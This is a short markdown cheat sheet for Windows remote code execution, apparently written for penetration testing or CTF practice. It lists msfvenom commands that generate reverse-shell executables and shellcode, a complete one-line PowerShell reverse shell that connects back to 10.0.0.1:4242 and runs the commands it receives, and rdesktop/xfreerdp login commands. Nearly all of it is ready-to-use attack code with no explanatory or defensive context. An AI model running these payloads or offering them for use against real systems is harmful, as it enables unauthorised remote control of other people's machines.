# Windows Remote Code Execution

## <a href='https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/' target="blank">MSFVenom Reverse Shell Payload Cheatsheet (with & without Meterpreter)</a>

## <a href='https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md' target="blank">Reverse Shell Cheat Sheet</a>

### Check list

``` bash
msfvenom  --list encoders
```

### File

``` bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

### Shell Code

``` bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -v shellcode -f py
```

## Reverse Shell using PowerShell

``` bash
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## <a href='https://miloserdov.org/?p=4516' target="blank">Windows remote desktop from Linux</a>

``` bash
rdesktop $ip -u Tester -p Pass

xfreerdp /f /u:Tester /p:<Pass> /v:192.168.0.101 /drive:D,/tmp
```